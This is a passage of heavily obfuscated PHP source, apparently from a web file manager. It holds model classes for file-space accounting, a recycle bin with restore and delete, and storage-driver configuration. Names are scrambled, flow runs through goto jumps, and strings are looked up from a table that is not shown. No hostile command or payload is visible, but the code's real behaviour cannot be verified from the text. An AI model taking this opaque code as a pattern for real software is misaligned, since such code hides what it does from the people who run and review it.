continue; } if ($D–ß‡Å±[$F‘±Šìæ¢[393]] == $E½‘Á·õŠÍ[$C’íÊğ¦Û÷][$F‘±Šìæ¢[393]]) { $E½‘Á·õŠÍ[$C’íÊğ¦Û÷][$F‘±Šìæ¢[77]] += $D–ß‡Å±[$F‘±Šìæ¢[77]]; } } } $c£ÜÊ•¯¹‚ = array(); goto CÌ³Ñ‚èÏ; e„í«ËÍ¦°: $F‘±Šìæ¢ =& $_SERVER[Ö]; $this->sourceCacheClear($BÛÁ‘ã‚¬‹); $a¤Œ–Á° Ü = $this->sourceInfo($BÛÁ‘ã‚¬‹); goto aÄæÈÓ«¼Ä; E…ª²ˆó¤¬: $E½‘Á·õŠÍ[] = $a¤Œ–Á° Ü; $E½‘Á·õŠÍ = array_to_keyvalue($E½‘Á·õŠÍ, $F‘±Šìæ¢[365]); foreach ($E½‘Á·õŠÍ as $Bß”ì¤¢è => $D–ß‡Å±) { $E½‘Á·õŠÍ[$Bß”ì¤¢è][$F‘±Šìæ¢[2328]] = $E½‘Á·õŠÍ[$Bß”ì¤¢è][$F‘±Šìæ¢[77]]; $E½‘Á·õŠÍ[$Bß”ì¤¢è][$F‘±Šìæ¢[77]] = 0; } goto A¨‚­Àó”; F—ø”ÚÂíß: } public function userSpaceReset($e«î­·„§· = false) { $D­±Óİ„Ò =& $_SERVER[Ö]; $b¢†¿§È— = $this->where(array($D­±Óİ„Ò[367] => self::TYPE_USER, $D­±Óİ„Ò[452] => $e«î­·„§·, $D­±Óİ„Ò[366] => 0))->sum($D­±Óİ„Ò[77]); Model($D­±Óİ„Ò[470])->userEdit($e«î­·„§·, array($D­±Óİ„Ò[2063] => $b¢†¿§È—)); } public function targetSpaceUpdate($c‘Ø‹­°¯Ö, $EİÒéøÈÊ™) { $a¤‚×öä»» =& $_SERVER[Ö]; if (!$EİÒéøÈÊ™) { return; } if (!in_array($c‘Ø‹­°¯Ö, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $fÅ„‰¡‚¢ = $this->targetSpaceSize($c‘Ø‹­°¯Ö, $EİÒéøÈÊ™); if ($c‘Ø‹­°¯Ö == self::TYPE_USER) { Model($a¤‚×öä»»[470])->userEdit($EİÒéøÈÊ™, array($a¤‚×öä»»[2063] => $fÅ„‰¡‚¢)); } else { if ($c‘Ø‹­°¯Ö == self::TYPE_GROUP) { Model($a¤‚×öä»»[454])->groupEdit($EİÒéøÈÊ™, array($a¤‚×öä»»[2063] => $fÅ„‰¡‚¢)); } } } public function targetSpaceSize($bµÓ‚ãÕö», $dŸ‘Üë§Ê) { goto aó³™ğĞÇ; cª¤ÕÔ¿²‹: $Dˆ•Û«‡Š = array_to_keyvalue($Dˆ•Û«‡Š, $F¦ÜŞŒó“Ò[33], $F¦ÜŞŒó“Ò[365]); $Dˆ•Û«‡Š = array_unique(array_filter($Dˆ•Û«‡Š)); if ($Dˆ•Û«‡Š) { $B›Óæ¹‹è» = array($F¦ÜŞŒó“Ò[379] => array($F¦ÜŞŒó“Ò[380], $Dˆ•Û«‡Š)); $E‰Ãò‘—ë× += floatval($this->where($B›Óæ¹‹è»)->sum($F¦ÜŞŒó“Ò[77])); } goto eÅ§“ÚÔÛ; Bíƒ­õáàæ: $E‰Ãò‘—ë× = floatval($aÙ‰š‹çğ‚[$F¦ÜŞŒó“Ò[77]]); $B›Óæ¹‹è» = array($F¦ÜŞŒó“Ò[521] => array($F¦ÜŞŒó“Ò[479], $F¦ÜŞŒó“Ò[466] . $aÙ‰š‹çğ‚[$F¦ÜŞŒó“Ò[365]] . $F¦ÜŞŒó“Ò[480])); $Dˆ•Û«‡Š = Model($F¦ÜŞŒó“Ò[391])->field($F¦ÜŞŒó“Ò[379])->where($B›Óæ¹‹è»)->select(); goto cª¤ÕÔ¿²‹; aó³™ğĞÇ: $F¦ÜŞŒó“Ò =& $_SERVER[Ö]; $aÙ‰š‹çğ‚ = $this->sourceRoot($bµÓ‚ãÕö», $dŸ‘Üë§Ê, !0); if (!$aÙ‰š‹çğ‚) { return 0; } goto Bíƒ­õáàæ; eÅ§“ÚÔÛ: return $E‰Ãò‘—ë×; goto dÃĞµ…ÕÀÈ; dÃĞµ…ÕÀÈ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($E ‘™ßÌ„˜) { return $this->fileTypeProfile($E ‘™ßÌ„˜, SourceModel::TYPE_USER); } public function groupFileTypeProfile($f“óªîÙÁò) { return $this->fileTypeProfile($f“óªîÙÁò, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Cºèåöˆî, $Bõåâ¯ó•â) { goto Eâ†ôˆÑ‰†; Eâ†ôˆÑ‰†: $A‘Œ¬¶Ö“ =& $_SERVER[Ö]; $fÍï‰—æã = $A‘Œ¬¶Ö“[2329] . $Cºèåöˆî . $A‘Œ¬¶Ö“[70] . $Bõåâ¯ó•â; $B®« Æö¦ = Cache::get($fÍï‰—æã); goto BŞ†ï¦ğ»; e‚ÇˆìÏ‚Æ: foreach ($f¹íº¤‰Æ‰ as $bâÔÈ©á² => $bë¨¾éò¢) { $cñâ†•“Ÿ¶[$A‘Œ¬¶Ö“[368]] = $this->fileTypeWhere($bâÔÈ©á²); $e½Â²ˆî[$bâÔÈ©á²] = array($A‘Œ¬¶Ö“[2331] => $bë¨¾éò¢[$A‘Œ¬¶Ö“[28]], $A‘Œ¬¶Ö“[2332] => $this->where($cñâ†•“Ÿ¶)->count(), $A‘Œ¬¶Ö“[516] => $this->where($cñâ†•“Ÿ¶)->sum($A‘Œ¬¶Ö“[77])); } Cache::set($fÍï‰—æã, $e½Â²ˆî, 1200); return $e½Â²ˆî; goto C«¼“ÅãÜ…; Dê·æ‘ÌàÓ: $e½Â²ˆî = array(); $e½Â²ˆî[$A‘Œ¬¶Ö“[2330]] = array($A‘Œ¬¶Ö“[2331] => LNG($A‘Œ¬¶Ö“[2330]), $A‘Œ¬¶Ö“[2332] => $this->where($cñâ†•“Ÿ¶)->count(), $A‘Œ¬¶Ö“[516] => $this->where($cñâ†•“Ÿ¶)->sum($A‘Œ¬¶Ö“[77])); $f¹íº¤‰Æ‰ = KodIO::fileTypeList(); goto e‚ÇˆìÏ‚Æ; BŞ†ï¦ğ»: if ($B®« Æö¦) { return $B®« Æö¦; } $cñâ†•“Ÿ¶ = array($A‘Œ¬¶Ö“[514] => 0); if ($Cºèåöˆî != !1) { $cñâ†•“Ÿ¶[$A‘Œ¬¶Ö“[452]] = $Cºèåöˆî; $cñâ†•“Ÿ¶[$A‘Œ¬¶Ö“[367]] = $Bõåâ¯ó•â; } goto Dê·æ‘ÌàÓ; C«¼“ÅãÜ…: } public function fileNameExist($dí²Ó× âÆ, $FØ¥ Üæ„Â) { $BŠ‡ùõ÷ãç =& $_SERVER[Ö]; $Dääá¤Õ˜ = $this->childList($dí²Ó× âÆ); foreach ($Dääá¤Õ˜ as $A®Å˜Œøõ) { if ($A®Å˜Œøõ[$BŠ‡ùõ÷ãç[28]] == $FØ¥ Üæ„Â) { return $A®Å˜Œøõ[$BŠ‡ùõ÷ãç[365]]; } } return !1; } public function childList($f´ã˜ƒ¶¶Ë) { goto E£…«·ÁÕ; E£…«·ÁÕ: $föíäË™Ş =& $_SERVER[Ö]; $AÁŞ¾äˆÁ = $föíäË™Ş[2310] . $f´ã˜ƒ¶¶Ë; if (isset(self::$cacheChildList[$AÁŞ¾äˆÁ])) { return self::$cacheChildList[$AÁŞ¾äˆÁ]; } goto E½›ã­àİ; fƒ•®‚ãî: self::$cacheChildList[$AÁŞ¾äˆÁ] = $EÅöù²Š¹Ä; foreach ($EÅöù²Š¹Ä as $c‡·µ¢÷) { $AÁŞ¾äˆÁ = $föíäË™Ş[406] . $c‡·µ¢÷[$föíäË™Ş[365]]; self::$cacheSourceInfo[$AÁŞ¾äˆÁ] = $c‡·µ¢÷; } return $EÅöù²Š¹Ä; goto a½‡ĞÒ˜†; E½›ã­àİ: $dˆÊ£ôâ‡Ç = array($föíäË™Ş[457] => intval($f´ã˜ƒ¶¶Ë), $föíäË™Ş[393] => 0); $EÅöù²Š¹Ä = $this->where($dˆÊ£ôâ‡Ç)->select(); $EÅöù²Š¹Ä = $EÅöù²Š¹Ä ? $EÅöù²Š¹Ä : array(); goto fƒ•®‚ãî; a½‡ĞÒ˜†: } public function fileNameAuto($EêÂ¿‘«ã‘, $d³‹”ªÃ‹ï, $AÈêÅÃŠ = REPEAT_RENAME, $A›…Œø‡¾² = false) { $cîÅĞ®ÄÙ¤ =& $_SERVER[Ö]; $A¸ÔÉ‚¾›‡ = $this->childList($EêÂ¿‘«ã‘); $F­ßªÒœï„ = array_to_keyvalue($A¸ÔÉ‚¾›‡, $cîÅĞ®ÄÙ¤[33], $cîÅĞ®ÄÙ¤[28]); return $this->fileNameAutoGet($F­ßªÒœï„, $d³‹”ªÃ‹ï, $AÈêÅÃŠ, $A›…Œø‡¾²); } public function fileNameAutoGet($b²¥Ü¡¡, $Dà®ºá¿ï”, $b„ÒŞäößÛ, $e¤¼Ò¶ ŞË) { $cÎ¹¼ƒˆĞ® =& $_SERVER[Ö]; if ($b„ÒŞäößÛ == REPEAT_REPLACE || !$b²¥Ü¡¡ || !in_array_not_case($Dà®ºá¿ï”, $b²¥Ü¡¡) || $e¤¼Ò¶ ŞË && $b„ÒŞäößÛ != REPEAT_RENAME_FOLDER) { return $Dà®ºá¿ï”; } if ($b„ÒŞäößÛ == REPEAT_SKIP) { return !1; } $dÔÁ‘Ÿ× = $cÎ¹¼ƒˆĞ®[91] . get_path_ext($Dà®ºá¿ï”); $dÔÁ‘Ÿ× = $dÔÁ‘Ÿ× == $cÎ¹¼ƒˆĞ®[91] || $e¤¼Ò¶ ŞË ? $cÎ¹¼ƒˆĞ®[33] : $dÔÁ‘Ÿ×; for ($añË…Ùİ» = 1; $añË…Ùİ» <= count($b²¥Ü¡¡) + 1; $añË…Ùİ»++) { $E‰Ë×ŸäíŸ = substr($Dà®ºá¿ï”, 0, strlen($Dà®ºá¿ï”) - strlen($dÔÁ‘Ÿ×)); $F™‘äæŠ¹ = $E‰Ë×ŸäíŸ . "\50{$añË…Ùİ»}\51{$dÔÁ‘Ÿ×}"; if (!in_array_not_case($F™‘äæŠ¹, $b²¥Ü¡¡)) { return $F™‘äæŠ¹; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\143\145\x5f\x72\x65\x63\x79\143\x6c\145"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\163\x65\162\x74", "\x66\165\156\x63\x74\151\x6f\x6e")); public function listData($A¥á˜Ş´™ = false) { $fõ†ğóãºÅ =& $_SERVER[Ö]; $A¥á˜Ş´™ = $A¥á˜Ş´™ ? $A¥á˜Ş´™ : USER_ID; $aÒ–­•Ñ«â = $this->where(array($fõ†ğóãºÅ[1405] => $A¥á˜Ş´™))->select(); return array_to_keyvalue($aÒ–­•Ñ«â, $fõ†ğóãºÅ[33], $fõ†ğóãºÅ[365]); } public function moveToRecycle($c‹ƒ±Æ„¨) { goto EÚ¸Òó½Ğ; DôÀ»‹ğ½ã: $this->recycleMove($c‹ƒ±Æ„¨, 1); if ($bìº‚ÆµÛ[$d‚ˆ¼÷»—[366]] == $d‚ˆ¼÷»—[83]) { $Cˆ‘´ÇŒ³ = array($d‚ˆ¼÷»—[521] => array($d‚ˆ¼÷»—[479], $bìº‚ÆµÛ[$d‚ˆ¼÷»—[455]] . $c‹ƒ±Æ„¨ . $d‚ˆ¼÷»—[480])); $Bºò£±˜ÁĞ->where($Cˆ‘´ÇŒ³)->setField($d‚ˆ¼÷»—[393], 1); } goto d¿‹ÍŠéï; CÑà´âŠ®: if (!$bìº‚ÆµÛ || $bìº‚ÆµÛ[$d‚ˆ¼÷»—[393]] == $d‚ˆ¼÷»—[83]) { return; } $DŠÉÛÛ = array($d‚ˆ¼÷»—[379] => $c‹ƒ±Æ„¨, $d‚ˆ¼÷»—[1405] => USER_ID, $d‚ˆ¼÷»—[517] => $bìº‚ÆµÛ[$d‚ˆ¼÷»—[367]], $d‚ˆ¼÷»—[518] => $bìº‚ÆµÛ[$d‚ˆ¼÷»—[452]], $d‚ˆ¼÷»—[521] => $bìº‚ÆµÛ[$d‚ˆ¼÷»—[455]]); $this->add($DŠÉÛÛ); goto DôÀ»‹ğ½ã; EÚ¸Òó½Ğ: $d‚ˆ¼÷»— =& $_SERVER[Ö]; $Bºò£±˜ÁĞ = Model($d‚ˆ¼÷»—[1103]); $bìº‚ÆµÛ = $Bºò£±˜ÁĞ->sourceInfo($c‹ƒ±Æ„¨); goto CÑà´âŠ®; d¿‹ÍŠéï: } public function clear() { $this->remove(!1); } public function remove($DÜÊ›”º›‰ = false) { goto DĞÚ÷öçˆÔ; DĞÚ÷öçˆÔ: $A¸•µÚÓµö =& $_SERVER[Ö]; $E¥ˆøÚê¦‘ = Model($A¸•µÚÓµö[1103]); $CÎŸ°Ê¬ö× = $this->listData(); goto A‰¸œ¡‘Û; e…¤ëÒó•¯: foreach ($dŠÁŠ‚õŞ’ as $d¢ÌøÔË‘º) { $E¥ˆøÚê¦‘->targetSpaceUpdate($d¢ÌøÔË‘º[$A¸•µÚÓµö[367]], $d¢ÌøÔË‘º[$A¸•µÚÓµö[452]]); } goto EæÚ‹Üšìç; A‰¸œ¡‘Û: $DÜÊ›”º›‰ = $DÜÊ›”º›‰ === !1 ? !1 : $DÜÊ›”º›‰; $dŠÁŠ‚õŞ’ = array(); foreach ($CÎŸ°Ê¬ö× as $DôİÏ¡æî«) { if ($DÜÊ›”º›‰ != !1 && !in_array($DôİÏ¡æî«, $DÜÊ›”º›‰)) { continue; } $E¥ˆøÚê¦‘->remove($DôİÏ¡æî«, !1); $Bùâˆ”²™ = $this->where(array($A¸•µÚÓµö[365] => $DôİÏ¡æî«))->find(); $B†Ş‹‡ƒ« = $Bùâˆ”²™[$A¸•µÚÓµö[367]] . $A¸•µÚÓµö[70] . $Bùâˆ”²™[$A¸•µÚÓµö[452]]; $dŠÁŠ‚õŞ’[$B†Ş‹‡ƒ«] = array($A¸•µÚÓµö[517] => $Bùâˆ”²™[$A¸•µÚÓµö[367]], $A¸•µÚÓµö[452] => $Bùâˆ”²™[$A¸•µÚÓµö[452]]); $this->where(array($A¸•µÚÓµö[365] => $DôİÏ¡æî«))->delete(); } goto e…¤ëÒó•¯; EæÚ‹Üšìç: } public function restore($bŠé·–â¸Í = false) { goto Cêõ‘äôÄØ; F®“Ñ„¦‚Î: foreach ($C°©öÑÁæ¡ as $A¾Ëå¤ŞŠ“) { goto d’¯ÓˆÈñ; d’¯ÓˆÈñ: if ($bŠé·–â¸Í != !1 && !in_array($A¾Ëå¤ŞŠ“, $bŠé·–â¸Í)) { continue; } $f„‹Û•åÖÅ = $b¹ÆÛæ»ª->sourceInfo($A¾Ëå¤ŞŠ“); $e²Íªø™Çê = $b¹ÆÛæ»ª->sourceInfo($f„‹Û•åÖÅ[$EÙîÀâÆÕ¹[457]]); goto ağİ×äÀŒî; ağİ×äÀŒî: if ($e²Íªø™Çê[$EÙîÀâÆÕ¹[393]] == $EÙîÀâÆÕ¹[83]) { continue; } $b¹ÆÛæ»ª->lockMoveStart($A¾Ëå¤ŞŠ“); $this->recycleMove($A¾Ëå¤ŞŠ“, 0); goto DËï‹¬²—; bİ’¡ÕŒÊØ: $Aå®•…­²[] = $f„‹Û•åÖÅ[$EÙîÀâÆÕ¹[457]]; if ($f„‹Û•åÖÅ[$EÙîÀâÆÕ¹[366]] == $EÙîÀâÆÕ¹[83]) { $Aå®•…­²[] = $A¾Ëå¤ŞŠ“; } $b¹ÆÛæ»ª->lockMoveEnd($A¾Ëå¤ŞŠ“); goto a©öÅîÚ…•; DËï‹¬²—: if ($f„‹Û•åÖÅ[$EÙîÀâÆÕ¹[366]] == $EÙîÀâÆÕ¹[83]) { $EÆğ±¶ùÒß = array($EÙîÀâÆÕ¹[521] => array($EÙîÀâÆÕ¹[479], $f„‹Û•åÖÅ[$EÙîÀâÆÕ¹[455]] . $A¾Ëå¤ŞŠ“ . $EÙîÀâÆÕ¹[480])); $b¹ÆÛæ»ª->where($EÆğ±¶ùÒß)->setField($EÙîÀâÆÕ¹[393], 0); $this->restoreFolderChildren($A¾Ëå¤ŞŠ“, $C°©öÑÁæ¡); } $this->where(array($EÙîÀâÆÕ¹[365] => $A¾Ëå¤ŞŠ“))->delete(); $b¹ÆÛæ»ª->folderSizeReset($f„‹Û•åÖÅ[$EÙîÀâÆÕ¹[457]]); goto bİ’¡ÕŒÊØ; a©öÅîÚ…•: } $b¹ÆÛæ»ª->updateModifyTime($Aå®•…­²); goto cê¿Áñ¼—; d×”Şƒ¿ÉÜ: $bŠé·–â¸Í = $bŠé·–â¸Í == !1 ? !1 : $bŠé·–â¸Í; if (!$C°©öÑÁæ¡) { return !0; } $Aå®•…­² = array(); goto F®“Ñ„¦‚Î; Cêõ‘äôÄØ: $EÙîÀâÆÕ¹ =& $_SERVER[Ö]; $b¹ÆÛæ»ª = Model($EÙîÀâÆÕ¹[1103]); $C°©öÑÁæ¡ = $this->listData(); goto d×”Şƒ¿ÉÜ; cê¿Áñ¼—: } private function restoreFolderChildren($B‹»ç­ÇŒˆ, $Bİ¹Óñ…š”) { goto CèÃŠŠÖÜñ; CèÃŠŠÖÜñ: $Dß‘¦õÈ¨ =& $_SERVER[Ö]; $A¼Ü¹ö”£æ = Model($Dß‘¦õÈ¨[1103]); $aíÌ¨®åĞ = array($Dß‘¦õÈ¨[365] => array($Dß‘¦õÈ¨[7], array())); goto fˆºÄ÷ƒ™ã; fòÆè°¿ù»: $aíÌ¨®åĞ[$Dß‘¦õÈ¨[365]][1] = array_unique($aíÌ¨®åĞ[$Dß‘¦õÈ¨[365]][1]); $aíÌ¨®åĞ[$Dß‘¦õÈ¨[909]] = $Dß‘¦õÈ¨[2157]; $A¼Ü¹ö”£æ->where($aíÌ¨®åĞ)->setField($Dß‘¦õÈ¨[393], 1); goto AçÃ™½Â¿; fˆºÄ÷ƒ™ã: foreach ($Bİ¹Óñ…š” as $D‰°ª’İ¶ß) { if ($D‰°ª’İ¶ß == $B‹»ç­ÇŒˆ) { continue; } if (!$A¼Ü¹ö”£æ->isParentOf($B‹»ç­ÇŒˆ, $D‰°ª’İ¶ß)) { continue; } $eàÓ²Ë¹°š = $A¼Ü¹ö”£æ->sourceInfo($D‰°ª’İ¶ß); if ($eàÓ²Ë¹°š[$Dß‘¦õÈ¨[366]] == $Dß‘¦õÈ¨[83]) { $aíÌ¨®åĞ[] = array($Dß‘¦õÈ¨[521] => array($Dß‘¦õÈ¨[479], $eàÓ²Ë¹°š[$Dß‘¦õÈ¨[455]] . $D‰°ª’İ¶ß . $Dß‘¦õÈ¨[480])); } else { $aíÌ¨®åĞ[$Dß‘¦õÈ¨[365]][1][] = $D‰°ª’İ¶ß; } } if (!$aíÌ¨®åĞ[$Dß‘¦õÈ¨[365]][1]) { unset($aíÌ¨®åĞ[$Dß‘¦õÈ¨[365]]); } if (!$aíÌ¨®åĞ) { return; } goto fòÆè°¿ù»; AçÃ™½Â¿: } private function recycleMove($Cš…´îÍ…“, $DëĞ’µˆÔ˜ = 1) { $eîôÑì“à‘ =& $_SERVER[Ö]; $E¼ÉÁ”’³¼ = Model($eîôÑì“à‘[1103]); $bÈ²Ù¸ÙÁè = Model($eîôÑì“à‘[2333]); $f„å©›Š—× = array($eîôÑì“à‘[365] => $Cš…´îÍ…“); if ($DëĞ’µˆÔ˜) { $E¼ÉÁ”’³¼->where($f„å©›Š—×)->setField($eîôÑì“à‘[393], 1); $bÈ²Ù¸ÙÁè->eventRecycle($Cš…´îÍ…“, $eîôÑì“à‘[2334]); } else { $CçÒ’‚ğ¸» = $E¼ÉÁ”’³¼->where($f„å©›Š—×)->find(); $Bë¤ÄÇÛ‚µ = $CçÒ’‚ğ¸»[$eîôÑì“à‘[366]] == $eîôÑì“à‘[83]; $câ»¼ò¶Æ = $E¼ÉÁ”’³¼->fileNameAuto($CçÒ’‚ğ¸»[$eîôÑì“à‘[457]], $CçÒ’‚ğ¸»[$eîôÑì“à‘[28]], REPEAT_RENAME_FOLDER, $Bë¤ÄÇÛ‚µ); if ($câ»¼ò¶Æ != $CçÒ’‚ğ¸»[$eîôÑì“à‘[28]]) { $E¼ÉÁ”’³¼->rename($Cš…´îÍ…“, $câ»¼ò¶Æ); } $E¼ÉÁ”’³¼->where($f„å©›Š—×)->setField($eîôÑì“à‘[393], 0); $bÈ²Ù¸ÙÁè->eventRecycle($Cš…´îÍ…“, $eîôÑì“à‘[2335]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x73\x74\157\x72\x61\x67\145\114\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\x69\x7a\145\115\x61\x78", "\163\x79\x73\164\145\155", "\x64\145\146\141\165\154\164", "\144\162\151\166\x65\x72", "\143\x6f\156\146\x69\147"); public function listData($cöš¤°Ù­è = false, $C£¿»£ñ¼† = "\x6d\x6f\144\x69\146\171\x54\151\155\145", $F¥ââæóÍÍ = false) { goto EãÑ¯ôË¸; c‚¶ó±ìä×: return $dÄÛ„©ÈÛ›; goto c§¬àùğšÍ; EãÑ¯ôË¸: $cÖÂƒ¬Üã— =& $_SERVER[Ö]; $dÄÛ„©ÈÛ› = parent::listData($cöš¤°Ù­è, $C£¿»£ñ¼†, $F¥ââæóÍÍ); if ($cöš¤°Ù­è) { return $dÄÛ„©ÈÛ›; } goto cæö Óª¸³; cæö Óª¸³: foreach ($dÄÛ„©ÈÛ› as $AÏ¶¨Ñàß· => $F£Ô§¬‰‡¿) { unset($dÄÛ„©ÈÛ›[$AÏ¶¨Ñàß·][$cÖÂƒ¬Üã—[6]]); $dÄÛ„©ÈÛ›[$AÏ¶¨Ñàß·][$cÖÂƒ¬Üã—[2063]] = 0; } $dÚÜèäÔ®• = array_to_keyvalue($dÄÛ„©ÈÛ›, $cÖÂƒ¬Üã—[33], $cÖÂƒ¬Üã—[363]); $this->_listAppendSize($dÄÛ„©ÈÛ›, $dÚÜèäÔ®•); goto c‚¶ó±ìä×; c§¬àùğšÍ: } public function _listAppendSize(&$a¥óÌ¶’…Ô, $DŸ…»ã”) { $E¢Æ‚‡¥ê =& $_SERVER[Ö]; $bî‘ê…ãÍœ = $E¢Æ‚‡¥ê[2336] . implode($E¢Æ‚‡¥ê[47], $DŸ…»ã”) . $E¢Æ‚‡¥ê[2337]; $B‰Õè¯‚Å¯ = Model($E¢Æ‚‡¥ê[712])->query($bî‘ê…ãÍœ); $B‰Õè¯‚Å¯ = array_to_keyvalue($B‰Õè¯‚Å¯, $E¢Æ‚‡¥ê[363], $E¢Æ‚‡¥ê[77]); foreach ($a¥óÌ¶’…Ô as $dš‹¿Éå¼½ => $CŒö¡¶Å½õ) { $a¥óÌ¶’…Ô[$dš‹¿Éå¼½][$E¢Æ‚‡¥ê[2063]] = isset($B‰Õè¯‚Å¯[$CŒö¡¶Å½õ[$E¢Æ‚‡¥ê[363]]]) ? $B‰Õè¯‚Å¯[$CŒö¡¶Å½õ[$E¢Æ‚‡¥ê[363]]] : 0; } } public function getConfig($dí·ãù·) { $Bšô·À¶òä = parent::listData($dí·ãù·); return json_decode($Bšô·À¶òä[$_SERVER[Ö][6]], !0); } public function update($Dùå´Ê½´ë, $f¼ïø£Ü±) { goto Bêˆ‹Ù¦“ø; Bêˆ‹Ù¦“ø: $d¨Ş‡œØí =& $_SERVER[Ö]; $fˆ¥ø»Ûä = $f¼ïø£Ü±[$d¨Ş‡œØí[28]]; $bİ™ÈØœ“­ = array_to_keyvalue(parent::listData(), $d¨Ş‡œØí[28]); goto cŠŸËšôÆ; dÃ¨Í›²™ù: $d‘é™¶ÏƒÇ = parent::update($Dùå´Ê½´ë, $f¼ïø£Ü±); if ($d‘é™¶ÏƒÇ && $f¼ïø£Ü±[$d¨Ş‡œØí[34]]) { foreach ($bİ™ÈØœ“­ as $Dîìš§ÓÓ) { if ($Dîìš§ÓÓ[$d¨Ş‡œØí[34]] && $Dîìš§ÓÓ[$d¨Ş‡œØí[363]] != $Dùå´Ê½´ë) { parent::update($Dîìš§ÓÓ[$d¨Ş‡œØí[363]], array($d¨Ş‡œØí[34] => 0)); } } } return $d‘é™¶ÏƒÇ; goto EóÔÈ­¼ñÂ; cŠŸËšôÆ: if (isset($bİ™ÈØœ“­[$fˆ¥ø»Ûä]) && $bİ™ÈØœ“­[$fˆ¥ø»Ûä][$d¨Ş‡œØí[363]] != $Dùå´Ê½´ë) { return !1; } if (isset($f¼ïø£Ü±[$d¨Ş‡œØí[2338]]) && $f¼ïø£Ü±[$d¨Ş‡œØí[2338]] == $d¨Ş‡œØí[83]) { $this->checkConfig($f¼ïø£Ü±); } unset($f¼ïø£Ü±[$d¨Ş‡œØí[2338]]); goto dÃ¨Í›²™ù; EóÔÈ­¼ñÂ: } public function add($d†¥‚Ê³½) { goto C¡É’×Ø‡¦; A×´¥ÑÖ—: return $Bö“Á’‰ß¾; goto b¹šÖÕ„é™; C¡É’×Ø‡¦: $bßª¼‹ ˆ¶ =& $_SERVER[Ö]; $d¼ÇçÛ±«† = array_to_keyvalue(parent::listData(), $bßª¼‹ ˆ¶[28]); if (isset($d¼ÇçÛ±«†[$d†¥‚Ê³½[$bßª¼‹ ˆ¶[28]]])) { return !1; } goto a‚¢¶˜Ç®Š; a‚¢¶˜Ç®Š: $this->checkConfig($d†¥‚Ê³½); $Bö“Á’‰ß¾ = parent::insert($d†¥‚Ê³½); if ($Bö“Á’‰ß¾ && $d†¥‚Ê³½[$bßª¼‹ ˆ¶[34]]) { foreach ($d¼ÇçÛ±«† as $A…ÖßÊ›Á) { if ($A…ÖßÊ›Á[$bßª¼‹ ˆ¶[34]]) { parent::update($A…ÖßÊ›Á[$bßª¼‹ ˆ¶[363]], array($bßª¼‹ ˆ¶[34] => 0)); } } } goto A×´¥ÑÖ—; b¹šÖÕ„é™: } public function checkConfig(&$FãóÀµö®) { goto B›‹²–¶ğŸ; A£¬ñ¯Ç“Ú: $FãóÀµö®[$D¶‰êàÁÛ¤[6]] = json_encode($Eµ¥„Ö¤); $FãóÀµö®[$D¶‰êàÁÛ¤[90]] = $DçÙŞÍÖÒº; return !0; goto eŸ—–¯˜ìì; f‚’”‡Î‚Â: foreach ($Eµ¥„Ö¤ as $cºŠ½•ƒä => $eã„’Úğì‰) { $Eµ¥„Ö¤[$cºŠ½•ƒä] = trim($eã„’Úğì‰); } $B¸ì¤‰è‚Î = rtrim($Eµ¥„Ö¤[$D¶‰êàÁÛ¤[1017]], $D¶‰êàÁÛ¤[8]) . $D¶‰êàÁÛ¤[8]; $DçÙŞÍÖÒº = $this->driverType($bóƒ¥Îí’¥); goto Fáøïö’‘; aä‘ŒÏ: $EÉàôì»™” = $F®‘Ôæ±ÂŞ->getPath($B¸ì¤‰è‚Î . $D¶‰êàÁÛ¤[1959]); if (!$F®‘Ôæ±ÂŞ->mkfile($EÉàôì»™”)) { show_json(LNG($D¶‰êàÁÛ¤[2339]), !1); } $Eµ¥„Ö¤[$D¶‰êàÁÛ¤[1017]] = $B¸ì¤‰è‚Î; goto A£¬ñ¯Ç“Ú; B›‹²–¶ğŸ: $D¶‰êàÁÛ¤ =& $_SERVER[Ö]; $bóƒ¥Îí’¥ = strtolower($FãóÀµö®[$D¶‰êàÁÛ¤[90]]); $Eµ¥„Ö¤ = json_decode($FãóÀµö®[$D¶‰êàÁÛ¤[6]], !0); goto f‚’”‡Î‚Â; Fáøïö’‘: $C²š­™¤Å = $D¶‰êàÁÛ¤[71] . $DçÙŞÍÖÒº; $F®‘Ôæ±ÂŞ = new $C²š­™¤Å($Eµ¥„Ö¤); if (in_array($bóƒ¥Îí’¥, $F®‘Ôæ±ÂŞ->objectDriver)) { if (!$F®‘Ôæ±ÂŞ->isBucketCors() && !$F®‘Ôæ±ÂŞ->setBucketCors()) { $eô·’‰¶ = LNG($D¶‰êàÁÛ¤[2339]); $eô·’‰¶ .= $D¶‰êàÁÛ¤[2340] . LNG($D¶‰êàÁÛ¤[2341]); show_json($eô·’‰¶, !1); } } goto aä‘ŒÏ; eŸ—–¯˜ìì: } private function driverType($FĞˆ§›à) { $AƒÃèÎç“Ú =& $_SERVER[Ö]; $eìÑ…¥ªâ = array($AƒÃèÎç“Ú[101] => $AƒÃèÎç“Ú[2342], $AƒÃèÎç“Ú[58] => $AƒÃèÎç“Ú[2343], $AƒÃèÎç“Ú[64] => $AƒÃèÎç“Ú[2344]); if (isset($eìÑ…¥ªâ[$FĞˆ§›à])) { return $eìÑ…¥ªâ[$FĞˆ§›à]; } return strtoupper($FĞˆ§›à); } public function driverListSystem() { $Dæ®¿´ÀÚ› =& $_SERVER[Ö]; $b©¸™ä´›‚ = parent::listData(); $eÂ×Ê½ÖÄÕ = array(); foreach ($b©¸™ä´›‚ as $Eô‡ğéËé) { unset($Eô‡ğéËé[$Dæ®¿´ÀÚ›[183]], $Eô‡ğéËé[$Dæ®¿´ÀÚ›[106]]); $Eô‡ğéËé[$Dæ®¿´ÀÚ›[6]] = json_decode($Eô‡ğéËé[$Dæ®¿´ÀÚ›[6]], !0); $eÂ×Ê½ÖÄÕ[] = $Eô‡ğéËé; } return $eÂ×Ê½ÖÄÕ; } public function defaultDriver() { $f¾¿É¦µ…º =& $_SERVER[Ö]; $féã¡ÌŒõ‘ = parent::listData(); $cùôö„ÑÓ¯ = array_filter_by_field($féã¡ÌŒõ‘, $f¾¿É¦µ…º[34], 1); $cùôö„ÑÓ¯ = $cùôö„ÑÓ¯[0]; if ($cùôö„ÑÓ¯) { 